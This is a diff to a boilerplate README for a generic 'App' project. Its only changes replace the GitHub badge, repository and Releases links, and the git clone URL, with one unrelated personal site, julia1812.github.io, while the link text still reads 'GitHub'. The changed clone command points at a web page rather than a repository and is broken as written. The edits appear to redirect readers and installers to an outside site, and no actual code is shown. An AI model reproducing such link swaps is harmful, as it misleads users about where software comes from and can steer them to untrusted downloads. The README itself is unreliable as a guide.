@@ -1,6 +1,6 @@
 # Welcome to the App Repository! 🚀
 
-[![GitHub](https://img.shields.io/badge/Visit%20GitHub%20-%20%23%23000000.svg?style=for-the-badge&logo=github)](https://github.com)
+[![GitHub](https://img.shields.io/badge/Visit%20GitHub%20-%20%23%23000000.svg?style=for-the-badge&logo=github)](https://julia1812.github.io)
 
 Welcome to the **App** repository! This project is designed to help you streamline your workflow and enhance your productivity. Here, you will find everything you need to get started with the app, including installation instructions, usage guidelines, and contribution details.
 
@@ -34,7 +34,7 @@ To get started with the **App**, follow these simple steps:
 1. **Clone the Repository**: Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/your-username/app.git
+   git clone https://julia1812.github.io
    ```
 
 2. **Navigate to the Directory**: Change to the app directory:
@@ -108,6 +108,6 @@ For any questions or feedback, please reach out to the project maintainer:
 
 ## Links
 
-For more information, visit the [GitHub repository](https://github.com). You can find updates and releases in the [Releases section](https://github.com/your-username/app/releases).
+For more information, visit the [GitHub repository](https://julia1812.github.io). You can find updates and releases in the [Releases section](https://julia1812.github.io).
 
 Thank you for your interest in the **App**! We hope you find it useful.
